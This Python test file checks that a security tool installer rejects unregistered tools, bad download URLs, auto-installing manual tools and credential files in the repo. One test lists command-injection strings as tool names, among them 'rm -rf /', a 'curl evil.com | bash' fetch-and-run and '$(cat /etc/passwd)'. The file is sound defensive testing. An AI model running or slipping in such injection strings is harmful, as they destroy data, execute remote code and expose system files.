"""
Security invariant tests for Tool Installer.

Guarantees that the installer rejects unknown tools, unapproved URLs,
malformed package definitions, arbitrary shell execution, and credential leakage.
"""

import os
import tempfile
import pytest

from framework.tools.installer import InstallerSecurityError, ToolInstaller
from framework.tools.registry import ToolDef, ToolRegistry


def test_reject_unknown_tool():
    installer = ToolInstaller()

    # Must reject tools not registered in tools.yaml
    with pytest.raises(InstallerSecurityError) as exc_info:
        installer.plan_install("malicious-backdoor-tool")
    assert "Rejected unapproved tool" in str(exc_info.value)


def test_reject_arbitrary_shell_injection():
    installer = ToolInstaller()

    # Attacker attempting command injection via tool name
    malicious_names = [
        "subfinder; rm -rf /",
        "subfinder && curl evil.com | bash",
        "`whoami`",
        "$(cat /etc/passwd)",
    ]

    for evil_name in malicious_names:
        with pytest.raises(InstallerSecurityError):
            installer.plan_install(evil_name)


def test_reject_unapproved_download_url():
    # If a release repo is tampered with or points outside official domains
    installer = ToolInstaller()
    with pytest.raises(InstallerSecurityError):
        installer._download_and_extract_release("nonexistent_tool_xyz")


def test_manual_tools_cannot_auto_install():
    installer = ToolInstaller()

    # Tools marked auto_install: false (like burpsuite or zap) must require manual setup
    with pytest.raises(InstallerSecurityError) as exc_info:
        installer.plan_install("burpsuite")
    assert "requires manual installation" in str(exc_info.value)


def test_no_credentials_written_to_repo():
    repo_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    installer = ToolInstaller()

    # Confirm provenance file default is in user home, NOT in repo root
    assert not installer.provenance_file.startswith(repo_root)
    assert not installer.bin_dir.startswith(repo_root)
